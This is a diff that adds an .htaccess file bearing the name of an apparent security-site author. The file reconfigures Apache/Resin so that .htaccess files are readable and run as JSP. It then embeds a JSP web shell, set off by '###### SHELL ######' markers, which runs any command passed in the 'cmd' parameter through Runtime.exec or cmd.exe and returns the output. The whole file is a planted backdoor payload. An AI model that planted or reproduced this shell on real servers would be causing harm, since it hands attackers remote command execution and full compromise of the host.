@@ -1,0 +1,12 @@
+# ALIF FUSOBAR - master@itsecurity.id - www.itsecurity.id
+
+<Files ~ "^\.ht">
+    Order allow,deny
+    Allow from all
+</Files>
+
+AddHandler caucho-request .htaccess
+
+###### SHELL ######
+<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2"><jsp:directive.page import="java.io.*"/><jsp:scriptlet>String cmd = request.getParameter("cmd");String output = "";Process p = null;String s = null;try {if (System.getProperty("os.name").toUpperCase().indexOf("WINDOWS") != -1){p = Runtime.getRuntime().exec("cmd.exe /C " + cmd);}else{p = Runtime.getRuntime().exec( cmd );}BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));while((s = sI.readLine()) != null) {out.println( s );}}catch(IOException e) {out.println( e );}}</jsp:scriptlet></jsp:root>
+###### LLEHS ######
